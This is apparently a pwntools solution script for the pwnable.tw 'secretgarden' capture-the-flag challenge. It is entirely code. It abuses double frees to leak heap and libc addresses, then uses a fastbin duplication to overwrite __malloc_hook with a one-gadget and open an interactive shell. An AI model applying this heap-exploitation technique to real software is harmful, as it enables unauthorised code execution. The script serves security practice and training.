from pwn import *


#io = process('./secretgarden')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# env={"LD_PRELOAD":"./libc_64.so.6"})
#io = remote('chall.pwnable.tw', 10203)
#libc = ELF('./libc_64.so.6')

def malloc(size, name, color):
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'1')
    print(io.recvuntil(b'Length of the name :'))
    io.sendline(str(size))
    print(io.recvuntil(b'The name of flower :'))
    io.send(name)
    print(io.recvuntil(b'The color of the flower :'))
    io.sendline(color)

def free(index):
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'3')
    print(io.recvuntil(b'Which flower do you want to remove from the garden:'))
    io.sendline(str(index))
	
def view():
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'2')

def free_all():
    print(io.recvuntil(b'Your choice : '))
    io.sendline(b'4')

# Leak heap
malloc(0x28, b'AAAA', b'AAAA') #0
free(0)
malloc(0x28, b'BBBB', b'BBBB') #1
free(1)
free(0)
free(1)
free(0)
view()
print(io.recvuntil(b'Name of the flower[1] :'))
heapbase = u64(io.recv(6)+b'\0\0') - 0x1040
print(hex(heapbase))
malloc(0x28, b'CCCC', b'CCCC') #2
free(2)
malloc(0x28, b'DDDD', b'DDDD') #3

# Leak libc
malloc(0x28, b'EEEE', b'EEEE') #4
free(4)
malloc(0x400, b'FFFF', b'FFFF') #5
malloc(0x28, b'GGGG', b'GGGG') #6
free(5)
free(4)
free(6)
free(4)
view()
print(io.recvuntil(b'Name of the flower[5] :'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b78
print(hex(libc.address))
malloc(0x28, b'HHHH', b'HHHH') #7
free(7)
malloc(0x28, b'IIII', b'IIII') #8
malloc(0x3d8, b'JJJJ', b'JJJJ') #9


malloc(0x68, b'KKKK', b'KKKK') #10
malloc(0x68, b'LLLL', b'LLLL') #11
malloc(0x68, b'MMMM', b'MMMM') #12

free(10)
free(11)
free(12)
free(11)
malloc(0x68, p64(libc.sym['__malloc_hook']-35), b'NNNN')
malloc(0x68, b'OOOO', b'OOOO')
malloc(0x68, b'PPPP', b'PPPP')
payload = b'\0'*0x13+p64(libc.address+0xf03a4)
malloc(0x68, payload, b'QQQQ')
#print(io.recvuntil(b'Your choice : '))
free(6)
free(6)
#io.sendline(b'1')
io.interactive()
